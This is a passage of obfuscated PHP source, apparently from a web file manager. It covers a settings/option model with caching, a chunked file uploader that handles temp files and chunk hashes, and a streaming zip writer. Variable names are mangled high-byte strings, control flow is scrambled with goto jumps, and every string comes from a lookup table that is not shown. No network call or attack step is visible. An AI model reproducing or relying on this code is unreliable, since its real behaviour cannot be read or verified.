$AåŠí‰õ¿‘ =& $_SERVER[‚Ğ°–—î]; $A–÷¨ ‚“¦ = array_field_key($A–÷¨ ‚“¦, $this->field); $DÌÙ¸‹˜Áï = Model($this->modelType)->get($AåŠí‰õ¿‘[365], $this->optionType . $AåŠí‰õ¿‘[366]); goto E¾á·¢°Ô¾; CĞ…åƒ–˜İ: $A–÷¨ ‚“¦[$AåŠí‰õ¿‘[107]] = time(); Model($this->modelType)->set($AåŠí‰õ¿‘[365], $DÌÙ¸‹˜Áï, $this->optionType . $AåŠí‰õ¿‘[366]); Model($this->modelType)->set($AåŠí‰õ¿‘[364] . $DÌÙ¸‹˜Áï, $A–÷¨ ‚“¦, $this->optionType); goto B½µ°Â• ·; B½µ°Â• ·: return $DÌÙ¸‹˜Áï; goto B¤¾¥Á ‘Á; E¾á·¢°Ô¾: $DÌÙ¸‹˜Áï = $DÌÙ¸‹˜Áï ? $DÌÙ¸‹˜Áï : 0; $A–÷¨ ‚“¦[$AåŠí‰õ¿‘[367]] = ++$DÌÙ¸‹˜Áï; $A–÷¨ ‚“¦[$AåŠí‰õ¿‘[187]] = time(); goto CĞ…åƒ–˜İ; B¤¾¥Á ‘Á: } public function update($e°Ë™¯áíÔ, $DëôÒƒê ) { goto BÙï‹ŒŞå; a³©¥‘Ü†æ: return Model($this->modelType)->set($f³íÔŞ‘êŠ[364] . $e°Ë™¯áíÔ, $DëôÒƒê , $this->optionType); goto D“àŠù»ë; Dµ÷³òì•³: if (!$Eº„“Ø°ŠÜ) { return !1; } $DëôÒƒê  = array_merge($Eº„“Ø°ŠÜ, $DëôÒƒê ); $DëôÒƒê [$f³íÔŞ‘êŠ[107]] = time(); goto a³©¥‘Ü†æ; BÙï‹ŒŞå: $f³íÔŞ‘êŠ =& $_SERVER[‚Ğ°–—î]; $DëôÒƒê  = array_field_key($DëôÒƒê , $this->field); $Eº„“Ø°ŠÜ = $this->listData($e°Ë™¯áíÔ); goto Dµ÷³òì•³; D“àŠù»ë: } public function remove($fŒ§‰åÆ‚£) { return Model($this->modelType)->remove($_SERVER[‚Ğ°–—î][364] . $fŒ§‰åÆ‚£, $this->optionType); } public function clear() { $A­ÓÕÆÛğ =& $_SERVER[‚Ğ°–—î]; Model($this->modelType)->remove($A­ÓÕÆÛğ[365], $this->optionType . $A­ÓÕÆÛğ[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Cçè¹ïÆÚ», $C‹‰¦¤’Ş×) { if (!$C‹‰¦¤’Ş×) { return !1; } $bÇˆåéÂÊ‹ = $this->listData(); $bÇˆåéÂÊ‹ = array_to_keyvalue($bÇˆåéÂÊ‹, $Cçè¹ïÆÚ»); return isset($bÇˆåéÂÊ‹[$C‹‰¦¤’Ş×]) ? $bÇˆåéÂÊ‹[$C‹‰¦¤’Ş×] : !1; } public function findByName($d‰İ¨²‰ÛÖ) { return $this->findByKey($_SERVER[‚Ğ°–—î][28], $d‰İ¨²‰ÛÖ); } protected function resetData($Cé¾ÑÜ®è) { $A Ÿ¶Î²À =& $_SERVER[‚Ğ°–—î]; $Cé¾ÑÜ®è = is_array($Cé¾ÑÜ®è) ? $Cé¾ÑÜ®è : array(); $f˜ªé÷ĞÆî = array(); for ($a°“Á–ÙÍâ = 0; $a°“Á–ÙÍâ < count($Cé¾ÑÜ®è); $a°“Á–ÙÍâ++) { $f˜ªé÷ĞÆî[$A Ÿ¶Î²À[364] . $Cé¾ÑÜ®è[$a°“Á–ÙÍâ][$A Ÿ¶Î²À[367]]] = $Cé¾ÑÜ®è[$a°“Á–ÙÍâ]; } return Model($this->modelType)->set($f˜ªé÷ĞÆî, !1, $this->optionType); } private function getAutoName($fĞîô¨Ğ‘Ñ) { $aïÛÚªùù¾ = array_to_keyvalue($this->listData(), $_SERVER[‚Ğ°–—î][28]); if (!$aïÛÚªùù¾ || !isset($aïÛÚªùù¾[$fĞîô¨Ğ‘Ñ])) { return $fĞîô¨Ğ‘Ñ; } for ($a§‡¢êì¹Ç = 1; $a§‡¢êì¹Ç < count($aïÛÚªùù¾); $a§‡¢êì¹Ç++) { $E¥˜¨‰ù÷ = $fĞîô¨Ğ‘Ñ . "\x28{$a§‡¢êì¹Ç}\51"; if (!isset($aïÛÚªùù¾[$E¥˜¨‰ù÷])) { return $E¥˜¨‰ù÷; } } return $E¥˜¨‰ù÷; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($EéŸªõèöŒ = false, $b‚ç¬±†ìÁ = '', $bİ‡§Ùî‰ = false) { goto c‘çÇ¿òíÛ; B»ÚÎÀ…: $a†¬¶³‡×Ñ = is_array($a†¬¶³‡×Ñ) ? $a†¬¶³‡×Ñ : array(); if (is_array($e½ÁªÓîõ)) { $e½ÁªÓîõ = array_merge($a†¬¶³‡×Ñ, $e½ÁªÓîõ); return $EéŸªõèöŒ ? isset($e½ÁªÓîõ[$EéŸªõèöŒ]) ? $e½ÁªÓîõ[$EéŸªõèöŒ] : null : $e½ÁªÓîõ; } $f”»àÔ…çº = $this->filterWhere(array($CÏ­óÆÄ»ƒ[29] => $b‚ç¬±†ìÁ)); goto Féğ¤¦ƒ »; Féğ¤¦ƒ »: $e½ÁªÓîõ = $this->where($f”»àÔ…çº)->select(); $e½ÁªÓîõ = array_to_keyvalue($e½ÁªÓîõ, $CÏ­óÆÄ»ƒ[89], $CÏ­óÆÄ»ƒ[359]); foreach ($e½ÁªÓîõ as $eŞÍ·…¯ => $FñŒŸ°ò•) { if ($bİ‡§Ùî‰ || in_array($eŞÍ·…¯, $this->jsonField)) { $e½ÁªÓîõ[$eŞÍ·…¯] = json_decode($FñŒŸ°ò•, !0); } } goto C²—…ŒÛ®§; C²—…ŒÛ®§: $this->cacheSet($b‚ç¬±†ìÁ, $e½ÁªÓîõ); $e½ÁªÓîõ = array_merge($a†¬¶³‡×Ñ, $e½ÁªÓîõ); return $EéŸªõèöŒ ? $e½ÁªÓîõ[$EéŸªõèöŒ] : $e½ÁªÓîõ; goto aÄæö¤¸¼À; c‘çÇ¿òíÛ: $CÏ­óÆÄ»ƒ =& $_SERVER[‚Ğ°–—î]; $e½ÁªÓîõ = $this->cacheGet($b‚ç¬±†ìÁ); $a†¬¶³‡×Ñ = $this->optionDefault($b‚ç¬±†ìÁ); goto B»ÚÎÀ…; aÄæö¤¸¼À: } public function set($Cê¾‚„‰™, $EöØ—Úˆ‚“ = false, $d¥ÎÃ”½º = '') { goto e îâ¤ÜÎ•; A¼Ñ‡Öõˆ: return $this->addAll($a¾å¥¡ê­, array(), !0); goto a×Æ‡ñØˆ; e îâ¤ÜÎ•: $d¬«Ÿ÷²»Ê =& $_SERVER[‚Ğ°–—î]; $this->cacheRemove($d¥ÎÃ”½º); $a¾å¥¡ê­ = array(); goto b³´Ğ‘èåª; b³´Ğ‘èåª: $FâÄ²“òî¼ = is_array($Cê¾‚„‰™) ? $Cê¾‚„‰™ : array($Cê¾‚„‰™ => $EöØ—Úˆ‚“); foreach ($FâÄ²“òî¼ as $C¶ö¬î–äæ => $cÆ—¢™†ƒ§) { if (is_array($cÆ—¢™†ƒ§)) { $cÆ—¢™†ƒ§ = json_encode_force($cÆ—¢™†ƒ§); } $this->checkLength($cÆ—¢™†ƒ§, !1, $this->tableName . $d¬«Ÿ÷²»Ê[4] . $Cê¾‚„‰™); $cÆ—¢™†ƒ§ = self::textEncode($cÆ—¢™†ƒ§); $FâÄ²“òî¼ = array($d¬«Ÿ÷²»Ê[29] => $d¥ÎÃ”½º, $d¬«Ÿ÷²»Ê[89] => $C¶ö¬î–äæ, $d¬«Ÿ÷²»Ê[359] => $cÆ—¢™†ƒ§); $a¾å¥¡ê­[] = $this->filterWhere($FâÄ²“òî¼); } if (!$a¾å¥¡ê­) { return !0; } goto A¼Ñ‡Öõˆ; a×Æ‡ñØˆ: } protected function optionDefault($E– øğŒ›º = '') { return !1; } public function setDeep($eòùÂ¬ç÷, $f£¢„‚Ù¿ = false, $EÇæ‚êçé” = '') { $BéÌÇçËÜœ = explode($_SERVER[‚Ğ°–—î][91], $eòùÂ¬ç÷); $f¯øŠŸƒÚ£ = $this->get(); array_set_value($f¯øŠŸƒÚ£, $eòùÂ¬ç÷, $f£¢„‚Ù¿); $this->set($BéÌÇçËÜœ[0], $f¯øŠŸƒÚ£[$BéÌÇçËÜœ[0]], $EÇæ‚êçé”); } public function remove($DùäÛÍÊò, $côâí¥â = '') { $f°¥ä£Õ¢¾ =& $_SERVER[‚Ğ°–—î]; $this->cacheRemove($côâí¥â); $bø¦…àº = $this->filterWhere(array($f°¥ä£Õ¢¾[89] => $DùäÛÍÊò, $f°¥ä£Õ¢¾[29] => $côâí¥â)); if (is_null($DùäÛÍÊò)) { unset($bø¦…àº[$f°¥ä£Õ¢¾[89]]); } return $this->where($bø¦…àº)->delete(); } public function cacheSet($d”—£¯¨«¿, $dñ„‚Çßê = false) { return Cache::set($this->cacheKey($d”—£¯¨«¿), $dñ„‚Çßê); } public function cacheGet($aáÊÀŒ±“) { return Cache::get($this->cacheKey($aáÊÀŒ±“)); } public function cacheRemove($D¡ á±Å¹ã) { return Cache::remove($this->cacheKey($D¡ á±Å¹ã)); } protected function filterWhere($F‰‰ã˜ã¡¹) { return $F‰‰ã˜ã¡¹; } protected function cacheKey($e•ƒÜÕí–Ÿ) { return $e•ƒÜÕí–Ÿ; } } goto F×«†ö‡; e“Ç±Ô‘âá: if (class_exists($_SERVER[‚Ğ°–—î][1967])) { class Services_JSON_Error extends PEAR_Error { function __construct($C°êÅ£Ì÷¬ = "\165\x6e\x6b\x6e\x6f\x77\x6e\40\145\x72\162\x6f\162", $cšæ’’‡¼š = null, $aŸÃÅ£È°ç = null, $b™À’¡¡ˆ = null, $dƒ«¼Á¼¬· = null) { parent::PEAR_Error($C°êÅ£Ì÷¬, $cšæ’’‡¼š, $aŸÃÅ£È°ç, $b™À’¡¡ˆ, $dƒ«¼Á¼¬·); } } } else { class Services_JSON_Error { function __construct($e«´â’‰ç = "\165\156\x6b\156\x6f\x77\x6e\40\x65\x72\162\x6f\162", $fêĞó¡Ä÷± = null, $aÄ°ãš•³ï = null, $EÓÉæ§’ = null, $Däïéæ’¦À = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cµˆøåÃ; cµˆøåÃ: $B†œ£ĞÈôÙ =& $_SERVER[‚Ğ°–—î]; global $in; $this->in =& $in; goto aÃèô«¬ÀŠ; b¨ÏÌù˜—Ë: $this->checkSize(); $this->tempPathInit(); goto e¼Šªé©º’; aÃèô«¬ÀŠ: if (!empty($_FILES)) { $Aõ›¿İ´ˆô = $_FILES[$B†œ£ĞÈôÙ[167]]; $this->uploadFile = $Aõ›¿İ´ˆô[$B†œ£ĞÈôÙ[1968]]; if (!$this->uploadFile && $Aõ›¿İ´ˆô[$B†œ£ĞÈôÙ[1219]] > 0) { show_json($this->errorInfo($Aõ›¿İ´ˆô[$B†œ£ĞÈôÙ[1219]]), !1); } } else { if (isset($in[$B†œ£ĞÈôÙ[386]])) { $this->uploadFile = isset($in[$B†œ£ĞÈôÙ[1969]]) ? $B†œ£ĞÈôÙ[1970] : $B†œ£ĞÈôÙ[1815]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto b¨ÏÌù˜—Ë; e¼Šªé©º’: } public function upload() { goto Eİˆ¾Œõê; Eİˆ¾Œõê: $Cë´ßÖíŠÑ =& $_SERVER[‚Ğ°–—î]; $eòŠ÷¤ÇÊ = isset($this->in[$Cë´ßÖíŠÑ[1971]]) ? intval($this->in[$Cë´ßÖíŠÑ[1971]]) : 0; $Eï”‚ æ¯³ = isset($this->in[$Cë´ßÖíŠÑ[1972]]) ? intval($this->in[$Cë´ßÖíŠÑ[1972]]) : 1; goto F‚Ÿ±ÔŸ¡; Dİ’ğÒß‘¯: $E³œŞ½ÑŞæ = $this->writeTo($d°ğËÊ‰ß, $b­Õõø–Áô, $this->tempFile); $BÌÈíî¯„¹ = IO::hashSimple($d°ğËÊ‰ß); $CŒá—ÊŠƒ¦ = IO::size($d°ğËÊ‰ß); goto E³‰” Œº; A•ˆ°…Şî: CacheLock::lock($this->tempFile, 20); $bÂ‹¨¼–à÷ = $this->statusGet(); $this->initFileTemp(); goto a§ÄÛÚœ÷˜; E³‰” Œº: @unlink($d°ğËÊ‰ß); if (!$E³œŞ½ÑŞæ) { $this->showJson($Cë´ßÖíŠÑ[1979] . $eòŠ÷¤ÇÊ, !1); } $bÂ‹¨¼–à÷[$Cë´ßÖíŠÑ[1980]] = $Eï”‚ æ¯³; goto dÑ›¶Ç‚¦; F‡ØÕÓğÃ: $CÊ©Ó¢†Ü = $eòŠ÷¤ÇÊ * $a½•¡†ê¼; $b­Õõø–Áô = @fopen($this->tempFile, $Cë´ßÖíŠÑ[1978]); fseek($b­Õõø–Áô, $CÊ©Ó¢†Ü); goto Dİ’ğÒß‘¯; dÒÏ¢öÎÔ: if ($Eï”‚ æ¯³ > 1 && $a½•¡†ê¼ <= 0) { show_json($Cë´ßÖíŠÑ[1975], !1); } if ($a½•¡†ê¼ > $CŒá—ÊŠƒ¦) { $Eï”‚ æ¯³ = 1; } if ($Eï”‚ æ¯³ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto A•ˆ°…Şî; dÑ›¶Ç‚¦: $bÂ‹¨¼–à÷[$Cë´ßÖíŠÑ[1981]][$Cë´ßÖíŠÑ[1982] . $eòŠ÷¤ÇÊ] = array($Cë´ßÖíŠÑ[1983] => $CÊ©Ó¢†Ü, $Cë´ßÖíŠÑ[1037] => $eòŠ÷¤ÇÊ, $Cë´ßÖíŠÑ[77] => $CŒá—ÊŠƒ¦, $Cë´ßÖíŠÑ[164] => $BÌÈíî¯„¹); $this->statusSet($bÂ‹¨¼–à÷); if (count($bÂ‹¨¼–à÷[$Cë´ßÖíŠÑ[1981]]) != $bÂ‹¨¼–à÷[$Cë´ßÖíŠÑ[1980]]) { $this->showJson($Cë´ßÖíŠÑ[1984] . $eòŠ÷¤ÇÊ, !0); } goto Fò¼Éå‘ñ; F‚Ÿ±ÔŸ¡: $fçÕÑ¿® = $this->tempFile . $Cë´ßÖíŠÑ[1973] . $eòŠ÷¤ÇÊ; $CŒá—ÊŠƒ¦ = isset($this->in[$Cë´ßÖíŠÑ[520]]) ? intval($this->in[$Cë´ßÖíŠÑ[520]]) : 0; $a½•¡†ê¼ = isset($this->in[$Cë´ßÖíŠÑ[1974]]) ? intval($this->in[$Cë´ßÖíŠÑ[1974]]) : 0; goto dÒÏ¢öÎÔ; a§ÄÛÚœ÷˜: $d°ğËÊ‰ß = $this->moveUploadedFile($fçÕÑ¿®); if ($CŒá—ÊŠƒ¦ > 0 && filesize($d°ğËÊ‰ß) == 0) { $this->showJson($Cë´ßÖíŠÑ[1976], !1); } if (!$d°ğËÊ‰ß) { $this->showJson(LNG($Cë´ßÖíŠÑ[1977]), !1); } goto F‡ØÕÓğÃ; Fò¼Éå‘ñ: ignore_timeout(); if (!$this->checkChunkHash($bÂ‹¨¼–à÷)) { $this->showJson($Cë´ßÖíŠÑ[1985], !1); } $this->statusSet(!1); goto dÈ˜¦‡·‹ˆ; dÈ˜¦‡·‹ˆ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto C·¡¢¯İÉï; C·¡¢¯İÉï: } private function checkSize() { $E§†ĞÀÕÒ =& $_SERVER[‚Ğ°–—î]; if (phpBuild64() || $this->in[$E§†ĞÀÕÒ[77]] < PHP_INT_MAX) { return; } show_json(LNG($E§†ĞÀÕÒ[1986]), !1); } private function showJson($c¹ ¶Á‹ß, $Aé£™‘í) { CacheLock::unlock($this->tempFile); if (!$Aé£™‘í) { return show_json($c¹ ¶Á‹ß, $Aé£™‘í); } show_json($c¹ ¶Á‹ß, $Aé£™‘í); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto aÃÃÇ‡õ×©; EÀµ¬¤˜¬–: touch($eø†ÑÁ÷ñ . $Då¸¡Ùß–Ã[1987]); $fĞ’µå„‡ = isset($this->in[$Då¸¡Ùß–Ã[1988]]) ? $this->in[$Då¸¡Ùß–Ã[1988]] : !1; if (strlen($fĞ’µå„‡) < 30) { $fĞ’µå„‡ = md5(USER_ID . $this->in[$Då¸¡Ùß–Ã[75]] . $this->fileName . $this->in[$Då¸¡Ùß–Ã[77]]); } goto cùÉ‹½©; aÃÃÇ‡õ×©: $Då¸¡Ùß–Ã =& $_SERVER[‚Ğ°–—î]; $eø†ÑÁ÷ñ = TEMP_FILES; @mk_dir($eø†ÑÁ÷ñ); goto EÀµ¬¤˜¬–; cùÉ‹½©: $this->tempFile = $eø†ÑÁ÷ñ . $Då¸¡Ùß–Ã[1989] . md5($fĞ’µå„‡ . $this->in[$Då¸¡Ùß–Ã[1533]]); goto dé¨â÷ÄÂ¸; dé¨â÷ÄÂ¸: } private function moveUploadedFile($Cë‰»Ó÷Œ½) { $d¦Ôª§Îˆæ =& $_SERVER[‚Ğ°–—î]; $B˜¶‡‹ö = $this->uploadFile; if ($B˜¶‡‹ö == $d¦Ôª§Îˆæ[1990]) { @file_put_contents($Cë‰»Ó÷Œ½, base64_decode($_REQUEST[$d¦Ôª§Îˆæ[1991]])); } else { if ($B˜¶‡‹ö == $d¦Ôª§Îˆæ[1815]) { $F™£‚·š¿ñ = @fopen($Cë‰»Ó÷Œ½, $d¦Ôª§Îˆæ[1523]); $this->writeTo($B˜¶‡‹ö, $F™£‚·š¿ñ, $Cë‰»Ó÷Œ½); } else { if (!move_uploaded_file($B˜¶‡‹ö, $Cë‰»Ó÷Œ½)) { return !1; } } } return $Cë‰»Ó÷Œ½; } private function writeTo($EßÂ†‹‚âö, $ağˆ¶ÉÑ‡Ë, $a¶®¢‚®¯) { goto D¬Í‹â½¸Ç; D¬Í‹â½¸Ç: $b›â¬§´õ  =& $_SERVER[‚Ğ°–—î]; $fŞŠğ‰â” = $b›â¬§´õ [1992] . $a¶®¢‚®¯; $cæÂ–¾Î„¶ = CacheLock::lock($fŞŠğ‰â”, 1); goto A‰ÄóÌÕÅ; A‰ÄóÌÕÅ: $AƒíÎ•ùó£ = @fopen($EßÂ†‹‚âö, $b›â¬§´õ [1522]); if (!$AƒíÎ•ùó£ || !$ağˆ¶ÉÑ‡Ë || !$cæÂ–¾Î„¶) { CacheLock::unlock($fŞŠğ‰â”); return !1; } while (!feof($AƒíÎ•ùó£)) { fwrite($ağˆ¶ÉÑ‡Ë, fread($AƒíÎ•ùó£, 1024 * 200)); } goto a¨‹¨’‚ÍÅ; d½š Õ’·º: return !0; goto BÃŸ©¥¹±¼; a¨‹¨’‚ÍÅ: fclose($AƒíÎ•ùó£); fclose($ağˆ¶ÉÑ‡Ë); CacheLock::unlock($fŞŠğ‰â”); goto d½š Õ’·º; BÃŸ©¥¹±¼: } private function statusGet() { goto cĞÊîïÉ½â; f°çÛµ“ì: $F•ƒéÇÕõä = !1; if (file_exists($bëİ£ÆéŠ¡)) { $F•ƒéÇÕõä = @file_get_contents($bëİ£ÆéŠ¡); } if ($F•ƒéÇÕõä) { $this->statusData = json_decode($F•ƒéÇÕõä, !0); } goto c°Œ›Ò“õ; c°Œ›Ò“õ: if (!$this->statusData) { $A¬ƒ”Ä²š = array($d˜Ñ¯¹îù[28] => $this->fileName, $d˜Ñ¯¹îù[1980] => 0, $d˜Ñ¯¹îù[1981] => array()); $this->statusSet($A¬ƒ”Ä²š); } return $this->statusData; goto fµÚ¾¼Š»; cĞÊîïÉ½â: $d˜Ñ¯¹îù =& $_SERVER[‚Ğ°–—î]; if (is_array($this->statusData)) { return $this->statusData; } $bëİ£ÆéŠ¡ = $this->tempFile . $d˜Ñ¯¹îù[1993]; goto f°çÛµ“ì; fµÚ¾¼Š»: } public function statusSet($có½äâ«Œ¤) { $a›ƒ¹…ø™’ = $this->tempFile . $_SERVER[‚Ğ°–—î][1993]; if (!$có½äâ«Œ¤) { if (file_exists($a›ƒ¹…ø™’)) { @unlink($a›ƒ¹…ø™’); } return !0; } $this->statusData = $có½äâ«Œ¤; return file_put_contents($a›ƒ¹…ø™’, json_encode($có½äâ«Œ¤)); } private function initFileTemp() { $A» ™„Ø¡š =& $_SERVER[‚Ğ°–—î]; if (file_exists($this->tempFile)) { return; } $dã¯ È‡£è = fopen($this->tempFile, $A» ™„Ø¡š[1994]); fseek($dã¯ È‡£è, $this->in[$A» ™„Ø¡š[77]] - 1, SEEK_SET); fwrite($dã¯ È‡£è, $A» ™„Ø¡š[468]); fclose($dã¯ È‡£è); } public function checkChunk() { goto dºã³˜÷—¾; eÌíÎó»Ñ: return $C†Å·âÀŸÁ; goto B²»ËùÄ‚Õ; Eßµª¯ëÇ³: $fï½ò´êÃ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($fï½ò´êÃ[$cºáĞªÓ§Ø[1981]] as $A„ŠìÓŒ±œ) { $D¬¿â­ˆ¤ = $A„ŠìÓŒ±œ[$cºáĞªÓ§Ø[164]]; if ($D¬¿â­ˆ¤) { $C†Å·âÀŸÁ[$cºáĞªÓ§Ø[1995] . $A„ŠìÓŒ±œ[$cºáĞªÓ§Ø[1037]]] = $D¬¿â­ˆ¤; } } goto eÌíÎó»Ñ; dºã³˜÷—¾: $cºáĞªÓ§Ø =& $_SERVER[‚Ğ°–—î]; $C†Å·âÀŸÁ = array(); CacheLock::lock($this->tempFile); goto Eßµª¯ëÇ³; B²»ËùÄ‚Õ: } private function checkChunkHash($C¡ì‡ªŸßå) { goto c÷¸®¥“¥Š; FŞ¤·ªÔé: return $fòªÔ—‹•¯; goto e¿î±ºƒ¾ª; AÒÜ¦ÇÜ¤: $fòªÔ—‹•¯ = !0; foreach ($C¡ì‡ªŸßå[$FÛğø†‚Œù[1981]] as $CÂÇ‰ñšˆØ) { fseek($BùĞ„öÀˆ×, $CÂÇ‰ñšˆØ[$FÛğø†‚Œù[1983]]); $A‰ªõ§š±‹ = PathDriverStream::hash($BùĞ„öÀˆ×, $CÂÇ‰ñšˆØ[$FÛğø†‚Œù[77]]); if ($CÂÇ‰ñšˆØ[$FÛğø†‚Œù[164]] != $A‰ªõ§š±‹) { $fòªÔ—‹•¯ = !1; break; } } fclose($BùĞ„öÀˆ×); goto FŞ¤·ªÔé; bù—Ø†Úº: $B˜Â¬™­ = _get($this->in, $FÛğø†‚Œù[1996]); if (strlen($B˜Â¬™­) == 32 && IO::hashSimple($this->tempFile) == $aÁ™–±£À› && IO::hashMd5($this->tempFile) == $B˜Â¬™­) { return !0; } $BùĞ„öÀˆ× = fopen($this->tempFile, $FÛğø†‚Œù[1170]); goto AÒÜ¦ÇÜ¤; c÷¸®¥“¥Š: $FÛğø†‚Œù =& $_SERVER[‚Ğ°–—î]; if (count($C¡ì‡ªŸßå[$FÛğø†‚Œù[1981]]) != $C¡ì‡ªŸßå[$FÛğø†‚Œù[1980]]) { return !1; } $aÁ™–±£À› = _get($this->in, $FÛğø†‚Œù[1988]); goto bù—Ø†Úº; e¿î±ºƒ¾ª: } public static function fileName() { goto f¡Ô÷Úà“; Fà³èŒŒ‚: if (!empty($_FILES)) { $bò¨‚çÚ›ñ = $bò¨‚çÚ›ñ ? $bò¨‚çÚ›ñ : $_FILES[$Få§ŞÍ¦½È[167]][$Få§ŞÍ¦½È[386]]; } if (!is_wap()) { return KodIO::clear($bò¨‚çÚ›ñ); } $dƒõ½ˆÎáÅ = strtotime($in[$Få§ŞÍ¦½È[1997]]); goto f¬¾ØöŒ²Ú; f¡Ô÷Úà“: $Få§ŞÍ¦½È =& $_SERVER[‚Ğ°–—î]; global $in; $bò¨‚çÚ›ñ = isset($in[$Få§ŞÍ¦½È[28]]) ? $in[$Få§ŞÍ¦½È[28]] : $Få§ŞÍ¦½È[33]; goto Fà³èŒŒ‚; f¬¾ØöŒ²Ú: $dƒõ½ˆÎáÅ = $dƒõ½ˆÎáÅ ? $dƒõ½ˆÎáÅ : time(); $eãÉ×áå¹® = strtolower($bò¨‚çÚ›ñ); if ($eãÉ×áå¹® == $Få§ŞÍ¦½È[1998] || $eãÉ×áå¹® == $Få§ŞÍ¦½È[1999]) { $bò¨‚çÚ›ñ = date($Få§ŞÍ¦½È[689], $dƒõ½ˆÎáÅ) . $Få§ŞÍ¦½È[70] . $in[$Få§ŞÍ¦½È[77]] . $Få§ŞÍ¦½È[1630]; } else { if ($eãÉ×áå¹® == $Få§ŞÍ¦½È[2000]) { $bò¨‚çÚ›ñ = date($Få§ŞÍ¦½È[689], $dƒõ½ˆÎáÅ) . $Få§ŞÍ¦½È[70] . $in[$Få§ŞÍ¦½È[77]] . $Få§ŞÍ¦½È[2001]; } } goto E‚àÃ±…‡; E‚àÃ±…‡: return KodIO::clear($bò¨‚çÚ›ñ); goto eŒ÷Ñ¥¥—¿; eŒ÷Ñ¥¥—¿: } private function errorInfo($dÌ¡İíğ²Ã) { $F×øÇ‹ ö  =& $_SERVER[‚Ğ°–—î]; $b»“Ç›×Ì¥ = array($F×øÇ‹ ö [2002], $F×øÇ‹ ö [2003], $F×øÇ‹ ö [2004], $F×øÇ‹ ö [2005], $F×øÇ‹ ö [2006], $F×øÇ‹ ö [2007], $F×øÇ‹ ö [2008], $F×øÇ‹ ö [2009]); return $dÌ¡İíğ²Ã . $F×øÇ‹ ö [4] . $b»“Ç›×Ì¥[$dÌ¡İíğ²Ã]; } } class ZipMake { const VERSION = "\60\56\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($fõîÕ¦ÏÉ‹ = null) { $F¥ÖŒïá =& $_SERVER[‚Ğ°–—î]; $this->outputStream = fopen($F¥ÖŒïá[2010], $F¥ÖŒïá[1226]); $this->outputName = $fõîÕ¦ÏÉ‹; $this->needHeaders = !0; } public function addFile($aôÍµ´ßßà, $fùÉ®ß±Š) { goto cº—†›Á‰…; Eêæ‡™°©¯: $B½ïí¾£ ê = $this->addFileHeader($aôÍµ´ßßà, $fâìŸšÉä); $A¸‡Èğø¶¯ = $F“ŠÉ¸¨” = filesize($fùÉ®ß±Š); $eë³¾²Ç­œ = fopen($fùÉ®ß±Š, $e„¡†ªÎ[2011]); goto D–¦‹õ†¯«; D–¦‹õ†¯«: while (!feof($eë³¾²Ç­œ)) { $fëä‚Üâò = fread($eë³¾²Ç­œ, 1048576); $this->send($fëä‚Üâò); } fclose($eë³¾²Ç­œ); $b­Š¦¤²Úº = hexdec(hash_file($e„¡†ªÎ[2012], $fùÉ®ß±Š)); goto fîèİÆ­Á¥; fîèİÆ­Á¥: $this->addFileFooter($aôÍµ´ßßà, $fâìŸšÉä, $b­Š¦¤²Úº, $A¸‡Èğø¶¯, $F“ŠÉ¸¨”, $B½ïí¾£ ê); goto fÙ˜áÑ™Ê¦; cº—†›Á‰…: $e„¡†ªÎ =& $_SERVER[‚Ğ°–—î]; $aôÍµ´ßßà = $this->filterFilename($aôÍµ´ßßà); $fâìŸšÉä = static::METHOD_STORE; goto Eêæ‡™°©¯; fÙ˜áÑ™Ê¦: } public function addFileFromStream($aè¬„µÑ†”, $bèˆ©ùÍ×¥) { goto AÔØòëˆ©; AÓÏÉŠ: $dçÂÃ×­…é = hash_init($_SERVER[‚Ğ°–—î][2012]); while (!feof($bèˆ©ùÍ×¥)) { $d”í¿‘´  = fread($bèˆ©ùÍ×¥, 1048576); hash_update($dçÂÃ×­…é, $d”í¿‘´ ); $this->send($d”í¿‘´ ); } $Aïœ¿ï ¶Å = hexdec(hash_final($dçÂÃ×­…é)); goto EìŞ”Œ‰…; AÔØòëˆ©: $aè¬„µÑ†” = $this->filterFilename($aè¬„µÑ†”); $DâŸÓã“ = static::METHOD_STORE; $c¤èåó˜Ëª = $this->addFileHeader($aè¬„µÑ†”, $DâŸÓã“); goto cŠã…½ìÔÔ; EìŞ”Œ‰…: $this->addFileFooter($aè¬„µÑ†”, $DâŸÓã“, $Aïœ¿ï ¶Å, $eÉƒ«º­Ù¤, $bİáêÜËùê, $c¤èåó˜Ëª); goto còÛåÂ¤›‚; cŠã…½ìÔÔ: fseek($bèˆ©ùÍ×¥, 0, SEEK_END); $eÉƒ«º­Ù¤ = $bİáêÜËùê = ftell($bèˆ©ùÍ×¥); rewind($bèˆ©ùÍ×¥); goto AÓÏÉŠ; còÛåÂ¤›‚: } public function finish() { foreach ($this->files as $d†Ä „êÒ) { $this->addCdrFile($d†Ä „êÒ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($C»”£®¿¸‚, $BÔÃ¸Ñ¯âˆ) { goto eë¢ãÆŞº; eë¢ãÆŞº: $b¯ µÊéÖÊ =& $_SERVER[‚Ğ°–—î]; $C»”£®¿¸‚ = preg_replace($b¯ µÊéÖÊ[2013], $b¯ µÊéÖÊ[33], $C»”£®¿¸‚); $e¶Ù‡¼ ˆê = strlen($C»”£®¿¸‚); goto E„ß¹ŠŠù‘; Eã Çí÷º: $dƒµ¢ĞöˆÆ = $this->packFields($EÏºæŞêìõ); $C˜äß ÊŠ° = $this->packFields($DË›éóˆÂ’); $this->send($dƒµ¢ĞöˆÆ . $C»”£®¿¸‚ . $C˜äß ÊŠ°); goto 